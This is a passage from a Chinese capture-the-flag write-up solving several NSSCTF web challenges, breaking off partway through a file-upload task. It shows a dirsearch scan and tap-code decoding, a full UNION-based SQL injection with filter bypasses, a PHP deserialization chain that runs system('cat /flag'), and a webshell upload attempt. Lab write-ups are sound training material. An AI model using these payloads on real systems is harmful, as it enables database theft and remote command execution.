<p><img src="https://pic1.imgdb.cn/item/67b32278d0e0a243d400464a.png"><br>这个<code>from</code>就是告诉我们还要添加Refer 拿到flag</p>
<h1 id="js-sign"><a href="#js-sign" class="headerlink" title="js_sign"></a>js_sign</h1><p><img src="https://pic1.imgdb.cn/item/67b322edd0e0a243d4004662.png"><br>只有一个输入框，如果输入错误会有一个弹窗<br>进行目录扫描，发现一个地址</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="NIX"><figure class="iseeu highlight /nix"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line">┌──(root㉿kakeru)-[~<span class="operator">/</span>tmp]</span><br><span class="line">└─<span class="comment"># dirsearch -u http://node5.anna.nssctf.cn:27571/</span></span><br><span class="line"><span class="operator">/</span>usr<span class="operator">/</span>lib<span class="operator">/</span>python3<span class="operator">/</span>dist-packages<span class="operator">/</span>dirsearch<span class="operator">/</span>dirsearch.py:<span class="number">23</span>: <span class="params">DeprecationWarning:</span> pkg_resources is deprecated as an API. See https:<span class="symbol">//setuptools.pypa.io/en/latest/pkg_resources.html</span></span><br><span class="line">  from pkg_resources <span class="built_in">import</span> DistributionNotFound, VersionConflict</span><br><span class="line"></span><br><span class="line">  _|. _ _  _  _  _ _|_    v0.<span class="number">4.3</span></span><br><span class="line"> (_<span class="operator">||</span>| _) (<span class="operator">/</span>_(_<span class="operator">||</span> (_| )</span><br><span class="line"></span><br><span class="line"><span class="params">Extensions:</span> php, aspx, jsp, html, js | HTTP <span class="params">method:</span> GET | <span class="params">Threads:</span> <span class="number">25</span> | Wordlist <span class="params">size:</span> <span class="number">11460</span></span><br><span class="line"></span><br><span class="line">Output <span class="params">File:</span> <span class="symbol">/root/tmp/reports/http_node5.anna.nssctf.cn_27571/__25-02-17_19-54-03.txt</span></span><br><span class="line"></span><br><span class="line"><span class="params">Target:</span> http:<span class="operator">//</span>node5.anna.nssctf.cn:<span class="number">27571</span><span class="symbol">/</span></span><br><span class="line"></span><br><span class="line">[<span class="number">19</span>:<span class="number">54</span>:<span class="number">03</span>] <span class="params">Starting:</span> </span><br><span class="line">[<span class="number">19</span>:<span class="number">54</span>:<span class="number">06</span>] <span class="number">403</span> <span class="operator">-</span>  <span class="number">288</span>B  <span class="operator">-</span> <span class="symbol">/.ht_wsr.txt</span>                                      </span><br><span class="line">[<span class="number">19</span>:<span class="number">54</span>:<span class="number">06</span>] <span class="number">403</span> <span class="operator">-</span>  <span class="number">288</span>B  <span class="operator">-</span> <span class="symbol">/.htaccess.save</span>                                   </span><br><span class="line">[<span class="number">19</span>:<span class="number">54</span>:<span class="number">06</span>] <span class="number">403</span> <span class="operator">-</span>  <span class="number">288</span>B  <span class="operator">-</span> <span class="symbol">/.htaccess.orig</span></span><br><span class="line">[<span class="number">19</span>:<span class="number">54</span>:<span class="number">06</span>] <span class="number">403</span> <span class="operator">-</span>  <span class="number">288</span>B  <span class="operator">-</span> <span class="symbol">/.htaccess.bak1</span></span><br><span class="line">[<span class="number">19</span>:<span class="number">54</span>:<span class="number">06</span>] <span class="number">403</span> <span class="operator">-</span>  <span class="number">288</span>B  <span class="operator">-</span> <span class="symbol">/.htaccess_orig</span>                                   </span><br><span class="line">[<span class="number">19</span>:<span class="number">54</span>:<span class="number">06</span>] <span class="number">403</span> <span class="operator">-</span>  <span class="number">288</span>B  <span class="operator">-</span> <span class="symbol">/.htaccess.sample</span></span><br><span class="line">[<span class="number">19</span>:<span class="number">54</span>:<span class="number">06</span>] <span class="number">403</span> <span class="operator">-</span>  <span class="number">288</span>B  <span class="operator">-</span> <span class="symbol">/.htaccess_extra</span></span><br><span class="line">[<span class="number">19</span>:<span class="number">54</span>:<span class="number">06</span>] <span class="number">403</span> <span class="operator">-</span>  <span class="number">288</span>B  <span class="operator">-</span> <span class="symbol">/.htaccess_sc</span></span><br><span class="line">[<span class="number">19</span>:<span class="number">54</span>:<span class="number">06</span>] <span class="number">403</span> <span class="operator">-</span>  <span class="number">288</span>B  <span class="operator">-</span> <span class="symbol">/.htaccessBAK</span>                                     </span><br><span class="line">[<span class="number">19</span>:<span class="number">54</span>:<span class="number">06</span>] <span class="number">403</span> <span class="operator">-</span>  <span class="number">288</span>B  <span class="operator">-</span> <span class="symbol">/.htaccessOLD</span></span><br><span class="line">[<span class="number">19</span>:<span class="number">54</span>:<span class="number">06</span>] <span class="number">403</span> <span class="operator">-</span>  <span class="number">288</span>B  <span class="operator">-</span> <span class="symbol">/.htaccessOLD2</span></span><br><span class="line">[<span class="number">19</span>:<span class="number">54</span>:<span class="number">06</span>] <span class="number">403</span> <span class="operator">-</span>  <span class="number">288</span>B  <span class="operator">-</span> <span class="symbol">/.html</span>                                            </span><br><span class="line">[<span class="number">19</span>:<span class="number">54</span>:<span class="number">06</span>] <span class="number">403</span> <span class="operator">-</span>  <span class="number">288</span>B  <span class="operator">-</span> <span class="symbol">/.htm</span>                                             </span><br><span class="line">[<span class="number">19</span>:<span class="number">54</span>:<span class="number">06</span>] <span class="number">403</span> <span class="operator">-</span>  <span class="number">288</span>B  <span class="operator">-</span> <span class="symbol">/.htpasswd_test</span></span><br><span class="line">[<span class="number">19</span>:<span class="number">54</span>:<span class="number">06</span>] <span class="number">403</span> <span class="operator">-</span>  <span class="number">288</span>B  <span class="operator">-</span> <span class="symbol">/.htpasswds</span></span><br><span class="line">[<span class="number">19</span>:<span class="number">54</span>:<span class="number">06</span>] <span class="number">403</span> <span class="operator">-</span>  <span class="number">288</span>B  <span class="operator">-</span> <span class="symbol">/.httr-oauth</span>                                      </span><br><span class="line">[<span class="number">19</span>:<span class="number">54</span>:<span class="number">19</span>] <span class="number">200</span> <span class="operator">-</span>  <span class="number">235</span>B  <span class="operator">-</span> <span class="symbol">/main.js</span>                                          </span><br><span class="line">[<span class="number">19</span>:<span class="number">54</span>:<span class="number">24</span>] <span class="number">403</span> <span class="operator">-</span>  <span class="number">288</span>B  <span class="operator">-</span> <span class="symbol">/server-status</span>                                    </span><br><span class="line">[<span class="number">19</span>:<span class="number">54</span>:<span class="number">24</span>] <span class="number">403</span> <span class="operator">-</span>  <span class="number">288</span>B  <span class="operator">-</span> <span class="operator">/</span>server-status<span class="symbol">/</span>                                   </span><br><span class="line">                                                                             </span><br><span class="line">Task Completed</span><br><span class="line"></span><br></pre></td></tr></table></figure></div>
<p>访问这个&#x2F;main.js </p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="TAP"><figure class="iseeu highlight /tap"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">document.getElementsByTagName(&quot;button&quot;)[0].addEventListener(&quot;click&quot;, ()=&gt;&#123;</span><br><span class="line">    flag=&quot;33<span class="number"> 43 </span>43<span class="number"> 13 </span>44<span class="number"> 21 </span>54<span class="number"> 34 </span>45<span class="number"> 21 </span>24<span class="number"> 33 </span>14<span class="number"> 21 </span>31<span class="number"> 11 </span>22<span class="number"> 12 </span>54<span class="number"> 44 </span>11<span class="number"> 35 </span>13<span class="number"> 34 </span>14 15&quot;</span><br><span class="line">    if (btoa(flag.value) == &#x27;dGFwY29kZQ==&#x27;) &#123;</span><br><span class="line">        alert(&quot;you got hint!!!&quot;);</span><br><span class="line">    &#125; else &#123;</span><br><span class="line">        alert(&quot;fuck off !!&quot;);</span><br><span class="line">    &#125;    </span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure></div>

<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="BASH"><figure class="iseeu highlight /bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">┌──(root㉿kakeru)-[~/tmp]</span><br><span class="line">└─# <span class="built_in">echo</span> dGFwY29kZQ== | <span class="built_in">base64</span> -d  </span><br><span class="line">tapcode  </span><br></pre></td></tr></table></figure></div>
<p>这个base64解码出来是<code>tapcode</code>，先去原界面输入了一下这个字符，还是不行，然后去搜索了一下 发现这是一种加密方式，flag就是用这种方式加密的</p>
<p><img src="https://pic1.imgdb.cn/item/67b3256cd0e0a243d40046d1.png"><br>让ai给我们解码了一下tapcode，得到</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="ROUTEROS"><figure class="iseeu highlight /routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">NSSCT FYOU <span class="built_in">FIND</span> FLAG BY TAPCODE</span><br></pre></td></tr></table></figure></div>
<p>或者先去掉空格，然后放到在线解码平台解码</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="DNS"><figure class="iseeu highlight /dns"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">┌──(root㉿kakeru)-[~/tmp]</span><br><span class="line">└─# echo &quot;<span class="number">33 43 43 13</span> <span class="number">44 21 54 34</span> <span class="number">45 21 24 33</span> <span class="number">14 21 31 11</span> <span class="number">22 12 54 44</span> <span class="number">11 35 13 34</span> <span class="number">14</span> <span class="number">15</span>&quot; | tr -d &quot; &quot;</span><br><span class="line"><span class="number">3343431344215434452124331421311122125444113513341415</span></span><br></pre></td></tr></table></figure></div>
<p>最后的flag就是NSSCTF{youfindflagbytapcode} （先尝试原本的顺序，然后把空格去掉，最后考虑括号内变成小写</p>
<h1 id="ez-sql"><a href="#ez-sql" class="headerlink" title="ez_sql"></a>ez_sql</h1><p><img src="https://pic1.imgdb.cn/item/67b327afd0e0a243d400473b.png"><br>开始sql注入吧<br>先直接在url中用get传参，提示我记得刚刚说了的！！ 用相对安全的方式传参！！！<br>所以用post传<br>这题就是字符型注入，输入1’就报错了，然后注释符用<code>#</code>也就可以了<br>但是前面输入<code>nss=-1&#39; #</code>这样都可以然后输入or 1&#x3D;1 就报错了，说明or或者空格被过滤了，那空格就用&#x2F;**&#x2F;代替<br>or就用双写绕过，双写绕过就是利用or被替换成空，这样oorrder就会变成o rder，同理后面也发现union被过滤，也用这种方式<br>1.查列数</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="CSHARP"><figure class="iseeu highlight /csharp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">nss=<span class="number">-1&#x27;</span><span class="comment">/**/</span>oorrder<span class="comment">/**/</span><span class="keyword">by</span><span class="comment">/**/</span><span class="number">3</span><span class="meta">#</span></span><br><span class="line"></span><br><span class="line">Flag: NSSCTF&#123;This_1s_F4ke_flag&#125;</span><br><span class="line">This <span class="keyword">is</span> <span class="literal">true</span> flag: NSSCTF&#123;Ar3_y0u_K1ngd1ng&#125;</span><br><span class="line"></span><br><span class="line">nss=<span class="number">-1&#x27;</span><span class="comment">/**/</span>oorrder<span class="comment">/**/</span><span class="keyword">by</span><span class="comment">/**/</span><span class="number">4</span><span class="meta">#</span></span><br><span class="line"></span><br><span class="line">Unknown column <span class="string">&#x27;4&#x27;</span> <span class="keyword">in</span> <span class="string">&#x27;order clause&#x27;</span></span><br></pre></td></tr></table></figure></div>
<p>所以一共就是三列<br>2.爆库</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="NIX"><figure class="iseeu highlight /nix"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">n<span class="attr">ss</span><span class="operator">=</span><span class="operator">-</span><span class="number">1</span>&#x27;<span class="comment">/**/</span>uunionnion<span class="comment">/**/</span>select<span class="comment">/**/</span><span class="number">1</span>,database(),<span class="number">3</span><span class="comment">#</span></span><br><span class="line"><span class="params">Flag:</span> NSSCTF&#123;This_1s_F4ke_flag&#125;</span><br><span class="line"></span><br><span class="line">This is <span class="literal">true</span> <span class="params">flag:</span> NSSCTF&#123;Ar3_y0u_K1ngd1ng&#125;</span><br></pre></td></tr></table></figure></div>
<p>这里没有直接给我们库名，所以猜测可能不在这页结果，这里要用到limit语句里限制查询结果数量</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PGSQL"><figure class="iseeu highlight /pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> * <span class="keyword">FROM</span> <span class="built_in">table_name</span> <span class="keyword">LIMIT</span> 偏移量, 数量;</span><br><span class="line"></span><br></pre></td></tr></table></figure></div>
<figure class="highlight n1ql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">nss=-1&#x27;<span class="comment">/**/</span>uunionnion<span class="comment">/**/</span><span class="keyword">select</span><span class="comment">/**/</span><span class="number">1</span>,<span class="keyword">database</span>(),<span class="number">3</span><span class="comment">/**/</span><span class="keyword">limit</span><span class="comment">/**/</span><span class="number">1</span>,<span class="number">1</span>#</span><br><span class="line"></span><br><span class="line">Flag: NSS_db</span><br><span class="line"></span><br><span class="line">This <span class="keyword">is</span> <span class="literal">true</span> flag: <span class="number">3</span></span><br></pre></td></tr></table></figure>
<p>3.爆表</p>
<figure class="highlight n1ql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">nss=-1&#x27;<span class="comment">/**/</span>uunionnion<span class="comment">/**/</span><span class="keyword">select</span><span class="comment">/**/</span><span class="number">1</span>,group_concat(table_name),<span class="number">3</span><span class="comment">/**/</span><span class="keyword">from</span><span class="comment">/**/</span>information_schema.tables<span class="comment">/**/</span><span class="keyword">where</span><span class="comment">/**/</span>table_schema=<span class="keyword">database</span>();#</span><br><span class="line"></span><br><span class="line">Table &#x27;infmation_schema.tables&#x27; doesn&#x27;t exist</span><br><span class="line"></span><br><span class="line">#因为or被过滤了所以需要双写绕过</span><br><span class="line">nss=-1&#x27;<span class="comment">/**/</span>uunionnion<span class="comment">/**/</span><span class="keyword">select</span><span class="comment">/**/</span><span class="number">1</span>,group_concat(table_name),<span class="number">3</span><span class="comment">/**/</span><span class="keyword">from</span><span class="comment">/**/</span>infoorrmation_schema.tables<span class="comment">/**/</span><span class="keyword">where</span><span class="comment">/**/</span>table_schema=<span class="keyword">database</span>()<span class="comment">/**/</span><span class="keyword">limit</span><span class="comment">/**/</span><span class="number">1</span>,<span class="number">1</span>;#</span><br><span class="line"></span><br><span class="line">Flag: NSS_tb,users</span><br><span class="line"></span><br><span class="line">This is true flag: 3</span><br></pre></td></tr></table></figure>
<p>4.爆列</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="CSHARP"><figure class="iseeu highlight /csharp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">nss=<span class="number">-1&#x27;</span><span class="comment">/**/</span>uunionnion<span class="comment">/**/</span><span class="keyword">select</span><span class="comment">/**/</span><span class="number">1</span>,group_concat(column_name),<span class="number">3</span><span class="comment">/**/</span><span class="keyword">from</span><span class="comment">/**/</span>infoorrmation_schema.columns<span class="comment">/**/</span><span class="keyword">where</span><span class="comment">/**/</span>table_name=<span class="string">&quot;NSS_tb&quot;</span><span class="comment">/**/</span>limit<span class="comment">/**/</span><span class="number">1</span>,<span class="number">1</span>;<span class="meta">#</span></span><br><span class="line">Flag: id,Secr3t,flll444g</span><br><span class="line"></span><br><span class="line">This <span class="keyword">is</span> <span class="literal">true</span> flag: <span class="number">3</span></span><br></pre></td></tr></table></figure></div>
<p>5.查值</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="CSHARP"><figure class="iseeu highlight /csharp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">nss=<span class="number">-1&#x27;</span><span class="comment">/**/</span>uunionnion<span class="comment">/**/</span><span class="keyword">select</span><span class="comment">/**/</span><span class="number">1</span>,group_concat(<span class="string">&quot;flll444g&quot;</span>),<span class="number">3</span><span class="comment">/**/</span><span class="keyword">from</span><span class="comment">/**/</span>NSS_db.NSS_tb<span class="comment">/**/</span>limit<span class="comment">/**/</span><span class="number">1</span>,<span class="number">1</span>;<span class="meta">#</span></span><br><span class="line">Flag: flll444g</span><br><span class="line"></span><br><span class="line">This <span class="keyword">is</span> <span class="literal">true</span> flag: <span class="number">3</span></span><br><span class="line"></span><br><span class="line">nss=<span class="number">-1&#x27;</span><span class="comment">/**/</span>uunionnion<span class="comment">/**/</span><span class="keyword">select</span><span class="comment">/**/</span><span class="number">1</span>,group_concat(Secr3t),<span class="number">3</span><span class="comment">/**/</span><span class="keyword">from</span><span class="comment">/**/</span>NSS_db.NSS_tb<span class="comment">/**/</span>limit<span class="comment">/**/</span><span class="number">1</span>,<span class="number">1</span><span class="meta">#</span></span><br><span class="line">Flag: NSSCTF&#123;dd0e46f4<span class="number">-4</span>ce9<span class="number">-4533</span><span class="number">-97f</span>0-d01251ae184a&#125;</span><br><span class="line"></span><br><span class="line">This <span class="keyword">is</span> <span class="literal">true</span> flag: <span class="number">3</span></span><br><span class="line"></span><br></pre></td></tr></table></figure></div>
<h1 id="ez-1zpop"><a href="#ez-1zpop" class="headerlink" title="ez_1zpop"></a>ez_1zpop</h1><p>题目</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PHP"><figure class="iseeu highlight /php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">dxg</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">   <span class="function"><span class="keyword">function</span> <span class="title">fmm</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">   </span>&#123;</span><br><span class="line">      <span class="keyword">return</span> <span class="string">&quot;nonono&quot;</span>;</span><br><span class="line">   &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">lt</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">   <span class="keyword">public</span> <span class="variable">$impo</span>=<span class="string">&#x27;hi&#x27;</span>;</span><br><span class="line">   <span class="keyword">public</span> <span class="variable">$md51</span>=<span class="string">&#x27;weclome&#x27;</span>;</span><br><span class="line">   <span class="keyword">public</span> <span class="variable">$md52</span>=<span class="string">&#x27;to NSS&#x27;</span>;</span><br><span class="line">   <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">   </span>&#123;</span><br><span class="line">      <span class="variable language_">$this</span>-&gt;impo = <span class="keyword">new</span> dxg;</span><br><span class="line">   &#125;</span><br><span class="line">   <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">   </span>&#123;</span><br><span class="line">      <span class="variable language_">$this</span>-&gt;impo = <span class="keyword">new</span> dxg;</span><br><span class="line">      <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;impo-&gt;<span class="title function_ invoke__">fmm</span>();</span><br><span class="line">   &#125;</span><br><span class="line"></span><br><span class="line">   <span class="function"><span class="keyword">function</span> <span class="title">__toString</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">   </span>&#123;</span><br><span class="line">      <span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable language_">$this</span>-&gt;impo) &amp;&amp; <span class="title function_ invoke__">md5</span>(<span class="variable">$this</span>-&gt;md51) == <span class="title function_ invoke__">md5</span>(<span class="variable">$this</span>-&gt;md52) &amp;&amp; <span class="variable language_">$this</span>-&gt;md51 != <span class="variable language_">$this</span>-&gt;md52)</span><br><span class="line">         <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;impo-&gt;<span class="title function_ invoke__">fmm</span>();</span><br><span class="line">   &#125;</span><br><span class="line">   <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">   </span>&#123;</span><br><span class="line">      <span class="keyword">echo</span> <span class="variable language_">$this</span>;</span><br><span class="line">   &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">fin</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">   <span class="keyword">public</span> <span class="variable">$a</span>;</span><br><span class="line">   <span class="keyword">public</span> <span class="variable">$url</span> = <span class="string">&#x27;https://www.ctfer.vip&#x27;</span>;</span><br><span class="line">   <span class="keyword">public</span> <span class="variable">$title</span>;</span><br><span class="line">   <span class="function"><span class="keyword">function</span> <span class="title">fmm</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">   </span>&#123;</span><br><span class="line">      <span class="variable">$b</span> = <span class="variable language_">$this</span>-&gt;a;</span><br><span class="line">      <span class="variable">$b</span>(<span class="variable language_">$this</span>-&gt;title);</span><br><span class="line">   &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;NSS&#x27;</span>])) &#123;</span><br><span class="line">   <span class="variable">$Data</span> = <span class="title function_ invoke__">unserialize</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;NSS&#x27;</span>]);</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">   <span class="title function_ invoke__">highlight_file</span>(__file__);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
<p>这题就是考php的反序列化链了，我们先要从结果出发，怎么样才能得到flag呢<br>之前做的反序列化题一般都是符合某种条件就输出flag，这里没有找到这样的文件，所以这个文件要我们通过某种方式获取<br>除了直接输出出来，那就是自己通过执行命令执行出来了。这里看着像能执行命令的只有这里<code> $b($this-&gt;title);</code><br>这不就是一个函数吗，<code>$b</code>是函数名<code>($this-&gt;title)</code>是参数，我们的目标就是用这个实现system函数。<br>然后这里也同时把fin这个类分析完了，那第一个dxg类发现没有任何用也不用再分析了<br>那就重点看这个lt类： 这里的__toString函数就是如果这两个md5一样但是本身一样就会执行$this-&gt;impo的fmm函数<br>那我们就让$this-&gt;impo是fin对象就可以了，这样才能达到我们执行函数的目的<br>最后是如何才能让这个__toString函数执行呢？只要这个被输出就可以了，这里__destruct函数有echo 可以！</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PHP"><figure class="iseeu highlight /php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">lt</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">   <span class="keyword">public</span> <span class="variable">$impo</span>=<span class="string">&#x27;hi&#x27;</span>;</span><br><span class="line">   <span class="keyword">public</span> <span class="variable">$md51</span>=<span class="string">&#x27;240610708&#x27;</span>;</span><br><span class="line">   <span class="keyword">public</span> <span class="variable">$md52</span>=<span class="string">&#x27;QNKCDZO&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">fin</span> </span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">   <span class="keyword">public</span> <span class="variable">$a</span> =  <span class="string">&quot;system&quot;</span>;</span><br><span class="line">   <span class="keyword">public</span> <span class="variable">$url</span> = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">   <span class="keyword">public</span> <span class="variable">$title</span> = <span class="string">&quot;cat /flag&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$nss</span> = <span class="keyword">new</span> <span class="title function_ invoke__">lt</span>();</span><br><span class="line"><span class="variable">$nss</span> -&gt; impo = <span class="keyword">new</span> <span class="title function_ invoke__">fin</span>();</span><br><span class="line"><span class="keyword">echo</span>(<span class="title function_ invoke__">serialize</span>(<span class="variable">$nss</span>));</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">O:<span class="number">2</span>:<span class="string">&quot;lt&quot;</span>:<span class="number">3</span>:&#123;s:<span class="number">4</span>:<span class="string">&quot;impo&quot;</span>;O:<span class="number">3</span>:<span class="string">&quot;fin&quot;</span>:<span class="number">3</span>:&#123;s:<span class="number">1</span>:<span class="string">&quot;a&quot;</span>;s:<span class="number">6</span>:<span class="string">&quot;system&quot;</span>;s:<span class="number">3</span>:<span class="string">&quot;url&quot;</span>;s:<span class="number">0</span>:<span class="string">&quot;&quot;</span>;s:<span class="number">5</span>:<span class="string">&quot;title&quot;</span>;s:<span class="number">9</span>:<span class="string">&quot;cat /flag&quot;</span>;&#125;s:<span class="number">4</span>:<span class="string">&quot;md51&quot;</span>;s:<span class="number">9</span>:<span class="string">&quot;240610708&quot;</span>;s:<span class="number">4</span>:<span class="string">&quot;md52&quot;</span>;s:<span class="number">7</span>:<span class="string">&quot;QNKCDZO&quot;</span>;&#125;</span><br></pre></td></tr></table></figure></div>
<p>得到这个序列化的结果之后还要记得绕过wakeup函数，这个就是修改参数的个数就可以了 把”lt”后面的3改成别的数字<br><img src="https://pic1.imgdb.cn/item/67b33e67d0e0a243d4004d96.png"></p>
<h1 id="file-master"><a href="#file-master" class="headerlink" title="file_master"></a>file_master</h1><p><img src="https://pic1.imgdb.cn/item/67b33eb6d0e0a243d4004d9e.png"><br>又是一道文件上传题目<br>先上传一个正常的一句话木马的php上去，看看会怎么样<br><img src="https://pic1.imgdb.cn/item/67b33f28d0e0a243d4004daa.png"><br>只让上传jpg格式的文件，试试修改后缀为jpg，bp抓包然后修改后缀<br><img src="https://pic1.imgdb.cn/item/67b33fb4d0e0a243d4004dcd.png"><br>返回的是invalid file head，说明会检测文件头来看看是不是真的图片，那就在前面加上GIF89a<br>然后提示图片的宽高有限制，我就把&lt;?php 用&lt;?&#x3D; 方式简写，但是还是这个问题<br>卡住之后看了wp找到原来index.php可以看到源码</p>
